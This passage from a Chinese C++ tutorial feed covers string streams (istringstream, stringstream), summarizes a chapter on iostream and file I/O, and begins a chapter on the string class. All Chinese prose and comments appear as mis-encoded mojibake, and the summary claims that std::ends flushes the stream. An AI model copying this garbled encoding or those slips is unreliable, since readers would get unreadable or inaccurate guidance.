ä½¿ç”¨è¯¥å­—ç¬¦ä¸²åˆ›å»ºä¸€ä¸ª <code>istringstream</code> å¯¹è±¡ã€‚</li><li> åƒä½¿ç”¨ <code>cin</code> ä¸€æ ·ï¼Œä½¿ç”¨ <code>&gt;&gt;</code> ä»æµä¸­æå–æ•°æ®åˆ°å˜é‡ä¸­ã€‚</li><li> å¯ä»¥æ£€æŸ¥æµçš„çŠ¶æ€ï¼ˆå¦‚ <code>good()</code>, <code>fail()</code>, <code>eof()</code>) æ¥åˆ¤æ–­æå–æ˜¯å¦æˆåŠŸã€‚</li></ol><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> data = <span class="string">&quot;Alice 30 95.5&quot;</span>; <span class="comment">// æ¨¡æ‹Ÿä¸€è¡Œæ•°æ®</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> config_line = <span class="string">&quot;window_width = 800&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> csv_data = <span class="string">&quot;10,20,30,40&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. è§£æç©ºæ ¼åˆ†éš”çš„æ•°æ®</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">istringstream</span> <span class="title">iss1</span><span class="params">(data)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iss1 &gt;&gt; name &gt;&gt; age &gt;&gt; score) &#123; <span class="comment">// å°è¯•æå–</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Parsed from data: Name=&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;, Age=&quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot;, Score=&quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to parse data string.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è§£æé…ç½®æ–‡ä»¶è¡Œ</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">istringstream</span> <span class="title">iss2</span><span class="params">(config_line)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> key, eq;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">if</span> (iss2 &gt;&gt; key &gt;&gt; eq &gt;&gt; value &amp;&amp; key == <span class="string">&quot;window_width&quot;</span> &amp;&amp; eq == <span class="string">&quot;=&quot;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Parsed config: Key=&quot;</span> &lt;&lt; key &lt;&lt; <span class="string">&quot;, Value=&quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to parse config line.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è§£æé€—å·åˆ†éš”çš„æ•°æ® (éœ€è¦æ‰‹åŠ¨å¤„ç†åˆ†éš”ç¬¦)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">istringstream</span> <span class="title">iss3</span><span class="params">(csv_data)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">char</span> comma;</span><br><span class="line">    <span class="keyword">while</span> (iss3 &gt;&gt; num) &#123; <span class="comment">// è¯»å–ä¸€ä¸ªæ•°å­—</span></span><br><span class="line">        numbers.push_back(num);</span><br><span class="line">        <span class="keyword">if</span> (iss3 &gt;&gt; comma &amp;&amp; comma == <span class="string">&#x27;,&#x27;</span>) &#123; <span class="comment">// è¯»å–å¹¶æ£€æŸ¥é€—å·</span></span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// å¦‚æœæœ‰é€—å·ï¼Œç»§ç»­å¾ªç¯</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// å¦‚æœæ²¡æœ‰é€—å·æˆ–è¯»å–å¤±è´¥ï¼Œç»“æŸå¾ªç¯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥æµçŠ¶æ€ï¼Œç¡®ä¿æ˜¯å› ä¸ºåˆ°è¾¾æœ«å°¾è€Œä¸æ˜¯å…¶ä»–é”™è¯¯</span></span><br><span class="line">    <span class="keyword">if</span> (!iss3.eof() &amp;&amp; iss3.fail() &amp;&amp; !iss3.bad()) &#123;</span><br><span class="line">         <span class="comment">// å¯èƒ½æœ€åä¸€ä¸ªæ•°å­—åé¢æ²¡æœ‰é€—å·ï¼Œè¿™æ˜¯æ­£å¸¸çš„</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!iss3.eof()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error parsing CSV data.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Parsed CSV numbers: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n : numbers) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>istringstream</code> å¸¸ç”¨äºè§£æä»æ–‡ä»¶ã€ç½‘ç»œæˆ–ç”¨æˆ·ç•Œé¢æ¥æ”¶åˆ°çš„æ–‡æœ¬æ•°æ®ã€‚</p><h3 id="ä½¿ç”¨-stringstream-è¿›è¡Œè¯»å†™"><a href="#ä½¿ç”¨-stringstream-è¿›è¡Œè¯»å†™" class="headerlink" title="ä½¿ç”¨ stringstream è¿›è¡Œè¯»å†™"></a>ä½¿ç”¨ <code>stringstream</code> è¿›è¡Œè¯»å†™</h3><p><code>stringstream</code> å…è®¸ä½ åœ¨åŒä¸€ä¸ªå­—ç¬¦ä¸²ç¼“å†²åŒºä¸Šè¿›è¡Œè¾“å…¥å’Œè¾“å‡ºæ“ä½œã€‚ä½ å¯ä»¥å…ˆå‘å…¶ä¸­å†™å…¥æ•°æ®ï¼Œç„¶åä»ä¸­è¯»å–æ•°æ®ï¼Œæˆ–è€…åè¿‡æ¥ã€‚</p><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">stringstream</span> ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. å†™å…¥æ•°æ®åˆ° stringstream</span></span><br><span class="line">    <span class="keyword">int</span> val1 = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> val2 = <span class="number">3.14</span>;</span><br><span class="line">    ss &lt;&lt; <span class="string">&quot;Data: &quot;</span> &lt;&lt; val1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; val2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ä»åŒä¸€ä¸ª stringstream è¯»å–æ•°æ®</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> label;</span><br><span class="line">    <span class="keyword">int</span> read_val1;</span><br><span class="line">    <span class="keyword">double</span> read_val2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨è¯»å–ä¹‹å‰ï¼Œé€šå¸¸ä¸éœ€è¦æ˜¾å¼é‡ç½®ä½ç½®ï¼Œå› ä¸ºå†™å…¥æŒ‡é’ˆå’Œè¯»å–æŒ‡é’ˆæ˜¯ç‹¬ç«‹çš„</span></span><br><span class="line">    <span class="comment">// ä½†å¦‚æœå†™å…¥åç«‹å³è¯»å–ï¼Œè¯»å–æŒ‡é’ˆä»åœ¨å¼€å¤´</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ss &gt;&gt; label &gt;&gt; read_val1 &gt;&gt; read_val2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read from stringstream: Label=&quot;</span> &lt;&lt; label</span><br><span class="line">                  &lt;&lt; <span class="string">&quot;, Val1=&quot;</span> &lt;&lt; read_val1 &lt;&lt; <span class="string">&quot;, Val2=&quot;</span> &lt;&lt; read_val2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to read from stringstream.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. æ¸…ç©ºå¹¶é‡ç”¨ï¼Œå…ˆè¯»å–åå†™å…¥</span></span><br><span class="line">    ss.str(<span class="string">&quot;100 Hello&quot;</span>); <span class="comment">// è®¾ç½®æ–°çš„å†…å®¹ï¼Œå¹¶é‡ç½®è¯»å†™ä½ç½®</span></span><br><span class="line">    ss.clear(); <span class="comment">// æ¸…é™¤ EOF æˆ–å…¶ä»–çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word;</span><br><span class="line">    ss &gt;&gt; num &gt;&gt; word; <span class="comment">// è¯»å– 100 å’Œ &quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å†™å…¥æ–°å†…å®¹ (ä¼šè¦†ç›–æˆ–è¿½åŠ ï¼Œå–å†³äºå®ç°å’ŒæŒ‡é’ˆä½ç½®ï¼Œé€šå¸¸æ˜¯è¦†ç›–)</span></span><br><span class="line">    <span class="comment">// ä¸ºäº†å®‰å…¨åœ°è¿½åŠ ï¼Œæœ€å¥½å…ˆè·å–å½“å‰å†…å®¹ï¼Œè¿½åŠ åå†è®¾ç½®å›å»ï¼Œæˆ–è€…ä½¿ç”¨ ostringstream</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> current_content = ss.str(); <span class="comment">// è·å– &quot;100 Hello&quot;</span></span><br><span class="line">    ss.str(<span class="string">&quot;&quot;</span>); <span class="comment">// æ¸…ç©º</span></span><br><span class="line">    ss.clear();</span><br><span class="line">    ss &lt;&lt; current_content &lt;&lt; <span class="string">&quot; World &quot;</span> &lt;&lt; num * <span class="number">2</span>; <span class="comment">// å†™å…¥æ—§å†…å®¹ã€æ–°å†…å®¹å’Œè®¡ç®—ç»“æœ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final stringstream content: &quot;</span> &lt;&lt; ss.str() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// Output: 100 Hello World 200</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>stringstream</code> åœ¨éœ€è¦å¯¹å­—ç¬¦ä¸²è¿›è¡Œå¤šæ¬¡æ ¼å¼åŒ–è½¬æ¢æˆ–è§£æçš„åœºæ™¯ä¸­å¾ˆæœ‰ç”¨ï¼Œä¾‹å¦‚åœ¨ä¸åŒæ ¼å¼ä¹‹é—´è½¬æ¢æ•°æ®ã€‚</p><p><strong>æ€»ç»“:</strong> å­—ç¬¦ä¸²æµæä¾›äº†ä¸€ç§å¼ºå¤§è€Œçµæ´»çš„æ–¹å¼ï¼Œå¯ä»¥åœ¨å†…å­˜ä¸­å®Œæˆæ•°æ®çš„æ ¼å¼åŒ–å’Œè§£æï¼Œå…¶æ¥å£ä¸æ ‡å‡†çš„æ§åˆ¶å°å’Œæ–‡ä»¶ I/O ä¿æŒä¸€è‡´ï¼Œæ˜“äºå­¦ä¹ å’Œä½¿ç”¨ã€‚</p><h2 id="17-6-æ€»ç»“"><a href="#17-6-æ€»ç»“" class="headerlink" title="17.6 æ€»ç»“"></a>17.6 æ€»ç»“</h2><p>æœ¬ç« è¯¦ç»†ä»‹ç»äº† C++ çš„è¾“å…¥/è¾“å‡º (I/O) ç³»ç»Ÿï¼Œè¯¥ç³»ç»ŸåŸºäº<strong>æµ (Stream)</strong> çš„æ¦‚å¿µï¼Œæä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£æ¥å¤„ç†æ¥è‡ªä¸åŒæºï¼ˆé”®ç›˜ã€æ–‡ä»¶ï¼‰å’Œå»å¾€ä¸åŒç›®çš„åœ°ï¼ˆå±å¹•ã€æ–‡ä»¶ï¼‰çš„æ•°æ®æµã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p><strong>I/O æ¦‚è¿°:</strong></p><ul><li>  <strong>æµ:</strong> å­—èŠ‚åºåˆ—çš„æŠ½è±¡ï¼Œç”¨äºè¿æ¥ç¨‹åºå’Œ I/O è®¾å¤‡ã€‚</li><li>  <strong>ç¼“å†²åŒº:</strong> ä¸´æ—¶å­˜å‚¨åŒºåŸŸï¼Œç”¨äºæé«˜ I/O æ•ˆç‡ã€‚åˆ†ä¸ºå®Œå…¨ç¼“å†²ã€è¡Œç¼“å†²ã€æ— ç¼“å†²ã€‚</li><li>  <strong><code>&lt;iostream&gt;</code>:</strong> æä¾›äº†æ ¸å¿ƒ I/O ç±»ï¼ˆ<code>ios_base</code>, <code>ios</code>, <code>istream</code>, <code>ostream</code>, <code>iostream</code>ï¼‰å’Œæ ‡å‡†æµå¯¹è±¡ (<code>cin</code>, <code>cout</code>, <code>cerr</code>, <code>clog</code>)ã€‚</li><li>  <strong>é‡å®šå‘:</strong> æ“ä½œç³»ç»ŸåŠŸèƒ½ï¼Œå…è®¸æ”¹å˜æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯æµçš„æ¥æºå’Œç›®çš„åœ°ï¼Œè€Œæ— éœ€ä¿®æ”¹ä»£ç ã€‚</li></ul></li><li><p><strong>ä½¿ç”¨ <code>cout</code> è¾“å‡º:</strong></p><ul><li>  ä¸»è¦ä½¿ç”¨é‡è½½çš„æ’å…¥è¿ç®—ç¬¦ (<code>&lt;&lt;</code>) è¾“å‡ºå„ç§æ•°æ®ç±»å‹ã€‚</li><li>  æ”¯æŒé“¾æ¥æ“ä½œ (<code>cout &lt;&lt; a &lt;&lt; b;</code>)ã€‚</li><li>  æä¾› <code>put()</code> è¾“å‡ºå•ä¸ªå­—ç¬¦ï¼Œ<code>write()</code> è¾“å‡ºæŒ‡å®šå­—èŠ‚æ•°çš„å†…å­˜å—ã€‚</li><li>  <strong>ç¼“å†²åŒºåˆ·æ–°:</strong> å¯ä»¥é€šè¿‡ <code>endl</code> (æ¢è¡Œå¹¶åˆ·æ–°)ã€<code>flush</code> (ä»…åˆ·æ–°)ã€<code>ends</code> (æ’å…¥ <code>\0</code> å¹¶åˆ·æ–°) æˆ–åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è‡ªåŠ¨åˆ·æ–°ã€‚<code>&#39;\n&#39;</code> åªæ’å…¥æ¢è¡Œç¬¦ã€‚</li><li>  <strong>æ ¼å¼åŒ–:</strong> å¯ä»¥é€šè¿‡æˆå‘˜å‡½æ•° (<code>width()</code>, <code>precision()</code>, <code>fill()</code>, <code>setf()</code>) æˆ–æ“çºµç¬¦ (<code>setw()</code>, <code>setprecision()</code>, <code>setfill()</code>, <code>fixed</code>, <code>scientific</code>, <code>hex</code>, <code>oct</code>, <code>dec</code>, <code>left</code>, <code>right</code>, <code>boolalpha</code> ç­‰ï¼Œéœ€åŒ…å« <code>&lt;iomanip&gt;</code>) æ§åˆ¶è¾“å‡ºçš„å®½åº¦ã€ç²¾åº¦ã€å¡«å……ã€å¯¹é½ã€åŸºæ•°ã€æµ®ç‚¹æ•°è¡¨ç¤ºç­‰ã€‚</li></ul></li><li><p><strong>ä½¿ç”¨ <code>cin</code> è¾“å…¥:</strong></p><ul><li>  ä¸»è¦ä½¿ç”¨é‡è½½çš„æå–è¿ç®—ç¬¦ (<code>&gt;&gt;</code>) è¯»å–æ•°æ®ã€‚é»˜è®¤è·³è¿‡å‰å¯¼ç©ºç™½ï¼Œè¯»å–ç›´åˆ°é‡åˆ°ä¸åŒ¹é…å­—ç¬¦æˆ–ç©ºç™½ã€‚</li><li>  <strong>æµçŠ¶æ€:</strong> <code>cin</code> ç»´æŠ¤çŠ¶æ€ä½ (<code>goodbit</code>, <code>eofbit</code>, <code>failbit</code>, <code>badbit</code>)ã€‚å¯ä»¥é€šè¿‡ <code>good()</code>, <code>eof()</code>, <code>fail()</code>, <code>bad()</code> æˆ–æµå¯¹è±¡æœ¬èº«åœ¨å¸ƒå°”ä¸Šä¸‹æ–‡ä¸­æ£€æŸ¥çŠ¶æ€ã€‚<code>failbit</code> è¡¨ç¤ºæ ¼å¼é”™è¯¯ï¼Œ<code>eofbit</code> è¡¨ç¤ºåˆ°è¾¾æ–‡ä»¶å°¾ã€‚</li><li>  <strong>é”™è¯¯å¤„ç†:</strong> è¯»å–å¤±è´¥åï¼Œéœ€ä½¿ç”¨ <code>clear()</code> æ¸…é™¤é”™è¯¯çŠ¶æ€ï¼Œå¹¶ä½¿ç”¨ <code>ignore()</code> ä¸¢å¼ƒç¼“å†²åŒºä¸­çš„æ— æ•ˆè¾“å…¥ã€‚</li><li>  <strong>å…¶ä»–æ–¹æ³•:</strong> <code>get()</code> (è¯»å–å•ä¸ªå­—ç¬¦ï¼Œä¸è·³è¿‡ç©ºç™½)ã€<code>getline()</code> (è¯»å–ä¸€è¡Œåˆ° C é£æ ¼æ•°ç»„ï¼Œä¸¢å¼ƒåˆ†éš”ç¬¦)ã€<code>read()</code> (è¯»å–æŒ‡å®šå­—èŠ‚æ•°)ã€<code>peek()</code> (æŸ¥çœ‹ä¸‹ä¸€ä¸ªå­—ç¬¦)ã€<code>gcount()</code> (è·å–ä¸Šæ¬¡è¯»å–çš„å­—ç¬¦æ•°)ã€<code>putback()</code> (æ”¾å›å­—ç¬¦)ã€<code>ignore()</code> (ä¸¢å¼ƒå­—ç¬¦)ã€‚</li></ul></li><li><p><strong>æ–‡ä»¶ I/O (<code>&lt;fstream&gt;</code>):</strong></p><ul><li>  ä½¿ç”¨ <code>ifstream</code> (è¾“å…¥)ã€<code>ofstream</code> (è¾“å‡º)ã€<code>fstream</code> (è¾“å…¥/è¾“å‡º) ç±»ã€‚</li><li>  é€šè¿‡æ„é€ å‡½æ•°æˆ– <code>open()</code> æ–¹æ³•å…³è”æ–‡ä»¶ï¼Œå¹¶æŒ‡å®š<strong>æ–‡ä»¶æ¨¡å¼</strong> (<code>in</code>, <code>out</code>, <code>app</code>, <code>ate</code>, <code>binary</code>, <code>trunc</code>)ã€‚</li><li>  å¿…é¡»ä½¿ç”¨ <code>is_open()</code> æˆ–æ£€æŸ¥æµçŠ¶æ€æ¥ç¡®è®¤æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚</li><li>  ä½¿ç”¨ä¸ <code>cin</code>/<code>cout</code> ç±»ä¼¼çš„æ“ä½œç¬¦å’Œæ–¹æ³•è¿›è¡Œè¯»å†™ã€‚</li><li>  æ–‡ä»¶æµå¯¹è±¡åœ¨é”€æ¯æ—¶è‡ªåŠ¨å…³é—­æ–‡ä»¶ã€‚</li><li>  å¯ä»¥é€šè¿‡ <code>argc</code> å’Œ <code>argv</code> å¤„ç†å‘½ä»¤è¡Œå‚æ•°æ¥æŒ‡å®šæ–‡ä»¶åã€‚</li><li>  <strong>éšæœºå­˜å–:</strong> ä½¿ç”¨ <code>seekg()</code> / <code>tellg()</code> (è¾“å…¥æŒ‡é’ˆ) å’Œ <code>seekp()</code> / <code>tellp()</code> (è¾“å‡ºæŒ‡é’ˆ) åœ¨æ–‡ä»¶ä¸­å®šä½è¯»å†™ä½ç½®ï¼Œå¸¸ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li></ul></li><li><p><strong>å†…æ ¸æ ¼å¼åŒ– (<code>&lt;sstream&gt;</code>):</strong></p><ul><li>  åœ¨å†…å­˜ä¸­è¿›è¡Œæ ¼å¼åŒ–è½¬æ¢ã€‚</li><li>  <strong><code>ostringstream</code>:</strong> å°†å„ç§æ•°æ®ç±»å‹æ ¼å¼åŒ–è¾“å‡ºåˆ°ä¸€ä¸ªå†…éƒ¨å­—ç¬¦ä¸²ç¼“å†²åŒºï¼Œé€šè¿‡ <code>str()</code> è·å–ç»“æœå­—ç¬¦ä¸²ã€‚</li><li>  <strong><code>istringstream</code>:</strong> å°†å·²æœ‰å­—ç¬¦ä¸²ä½œä¸ºè¾“å…¥æºï¼Œä»ä¸­æŒ‰æ ¼å¼è§£ææå–æ•°æ®ã€‚</li><li>  <strong><code>stringstream</code>:</strong> æ”¯æŒå¯¹åŒä¸€ä¸ªå†…éƒ¨å­—ç¬¦ä¸²ç¼“å†²åŒºè¿›è¡Œè¯»å†™æ“ä½œã€‚</li><li>  æ¥å£ä¸æ–‡ä»¶æµå’Œæ§åˆ¶å°æµä¸€è‡´ï¼Œæ”¯æŒæ ¼å¼åŒ–æ“çºµç¬¦ã€‚</li></ul></li></ol><p>C++ çš„ iostream åº“æä¾›äº†ä¸€ä¸ªç±»å‹å®‰å…¨ã€å¯æ‰©å±•ä¸”åŠŸèƒ½ä¸°å¯Œçš„ I/O æ¡†æ¶ï¼Œé€‚ç”¨äºæ§åˆ¶å°ã€æ–‡ä»¶ä»¥åŠå†…å­˜ä¸­çš„æ ¼å¼åŒ–æ“ä½œã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 16 string ç±»å’Œæ ‡å‡†æ¨¡æ¿åº“</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_16/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_16/</url>
      
        <content type="html"><![CDATA[<h2 id="16-1-string-ç±»"><a href="#16-1-string-ç±»" class="headerlink" title="16.1 string ç±»"></a>16.1 string ç±»</h2><p>æˆ‘ä»¬åœ¨ç¬¬ 4 ç« å·²ç»åˆæ­¥æ¥è§¦äº† C++ æ ‡å‡†åº“ä¸­çš„ <code>string</code> ç±»ã€‚ä¸ C è¯­è¨€é£æ ¼çš„ã€ä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦æ•°ç»„ï¼ˆC-é£æ ¼å­—ç¬¦ä¸²ï¼‰ç›¸æ¯”ï¼Œ<code>string</code> ç±»æä¾›äº†æ›´å¼ºå¤§ã€æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„å­—ç¬¦ä¸²å¤„ç†æ–¹å¼ã€‚</p><p><strong>ä¼˜ç‚¹:</strong></p><ul><li>  <strong>è‡ªåŠ¨å†…å­˜ç®¡ç†:</strong> <code>string</code> å¯¹è±¡ä¼šè‡ªåŠ¨ç®¡ç†å­˜å‚¨å­—ç¬¦ä¸²æ‰€éœ€çš„å†…å­˜ï¼Œæ— éœ€æ‰‹åŠ¨åˆ†é…å’Œé‡Šæ”¾ï¼Œé¿å…äº†è®¸å¤š C é£æ ¼å­—ç¬¦ä¸²å¸¸è§çš„å†…å­˜é”™è¯¯ï¼ˆå¦‚ç¼“å†²åŒºæº¢å‡ºï¼‰ã€‚</li><li>  <strong>ä¸°å¯Œçš„æ“ä½œ:</strong> æä¾›äº†å¤§é‡çš„æˆå‘˜å‡½æ•°ç”¨äºå­—ç¬¦ä¸²çš„æŸ¥æ‰¾ã€æ‹¼æ¥ã€æ¯”è¾ƒã€ä¿®æ”¹ã€æ’å…¥ã€åˆ é™¤ç­‰æ“ä½œã€‚</li><li>  <strong>å®‰å…¨æ€§:</strong> æˆå‘˜å‡½æ•°é€šå¸¸ä¼šè¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼ˆå¦‚ <code>at()</code> æ–¹æ³•ï¼‰ï¼Œæˆ–è€…æä¾›æ˜ç¡®å®šä¹‰çš„æ“ä½œè¡Œä¸ºã€‚</li><li>  <strong>ä¸ STL å…¼å®¹:</strong> å¯ä»¥æ–¹ä¾¿åœ°ä¸æ ‡å‡†æ¨¡æ¿åº“ (STL) ä¸­çš„ç®—æ³•å’Œå®¹å™¨ä¸€èµ·ä½¿ç”¨ã€‚</li></ul><p><code>string</code> ç±»å®é™…ä¸Šæ˜¯æ¨¡æ¿ç±» <code>basic_string&lt;char&gt;</code> çš„ä¸€ä¸ª <code>typedef</code>ï¼ˆç±»å‹åˆ«åï¼‰ã€‚å®ƒå®šä¹‰åœ¨ <code>&lt;string&gt;</code> å¤´æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 